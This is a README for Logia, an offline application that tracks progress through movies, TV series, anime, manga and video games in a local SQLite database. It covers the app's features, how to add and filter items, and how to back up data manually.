# 📚 Logia - Manage your personal media collections easily

[![Download Logia](https://img.shields.io/badge/Download-Logia-blue.svg)](https://thematic-ulysses679.github.io)

Logia acts as your central hub for tracking media. You can monitor progress for movies, television series, anime, manga, and video games. The application organizes your collections into a single, private location on your computer.

Logia runs offline. Your data stays on your machine and you control your information at all times.

## 🎯 Features

Logia provides tools to manage complex lists. These features ensure your data stays accurate:

*   Media Tracking: Mark episodes as watched, add volumes for books, or track total playtime for games.
*   Custom Collections: Build lists for items not covered by default types. You define the fields.
*   Detailed Management: Sort entries by title, progress, or date added.
*   Data Privacy: Your database uses SQLite and remains local. No cloud syncing or external data sharing occurs.
*   Clean Interface: A simple layout lets you view your library without clutter.

## 🛠️ Usage Guide

You can begin adding items immediately after the first launch.

### Adding New Items
Click the "Plus" button located in the top corner of the main dashboard. A window will appear asking for the item name and type. Select the category from the list. If you choose a custom collection, define the tracking metrics like "Chapters" or "Hours" during this stage.

### Tracking Progress
Click an item in your library to open its detail view. Use the input fields to update your current status. The application saves these changes automatically. You can return to these entries at any time to revise your progress.

### Filtering Your Library
Use the search bar at the top of the screen to find specific titles. You can also use the filter menu to show only "In Progress" or "Finished" items.

## 🔒 Data Protection

Logia operates entirely offline. You own the files. If you need to back up your database, you can locate the application folder in your local user directory. Copying this folder to a external drive or cloud storage provides a manual backup of all your progress records.
